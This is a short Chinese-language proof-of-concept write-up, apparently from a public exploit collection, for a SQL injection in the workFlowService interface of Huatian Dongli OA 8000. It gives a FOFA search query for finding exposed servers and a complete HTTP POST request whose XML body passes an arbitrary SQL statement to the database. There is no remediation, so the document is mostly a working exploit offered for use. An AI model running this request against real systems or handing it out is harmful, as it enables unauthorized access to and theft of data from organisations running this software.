# 华天动力oa SQL注入

## 1.漏洞描述

华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息

## 2.搜索语法

```plain
fofa：app="华天动力-OA8000"
```

## 3.漏洞复现

```plain
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0

<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>
```

响应包显示如下

![image](https://github.com/hardog123/poc-exp/assets/170905460/60587f5e-ff2d-42ca-8cc1-eb61a09f1551)
